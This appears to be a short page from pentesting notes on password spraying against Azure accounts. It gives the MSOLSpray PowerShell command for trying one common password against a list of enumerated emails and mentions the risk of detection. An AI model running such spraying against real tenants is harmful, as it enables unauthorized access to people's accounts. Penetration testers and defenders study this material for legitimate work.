---
title: Password Spraying
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/service-discovery-recon-enumeration-and-initial-access-attacks/password-spraying
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

**Not a great attack method against cloud infrastructure, but it is possible.**

Use a single password against multiple users that were enumerated. For Azure, password spray attacks can be done against different API endpoints.

#### MSOLSpray

```powershell
Invoke-MSOLSpray -UserList validemails.txt -Password Password123! -Verbose
```

This is noisy and may lead to detection
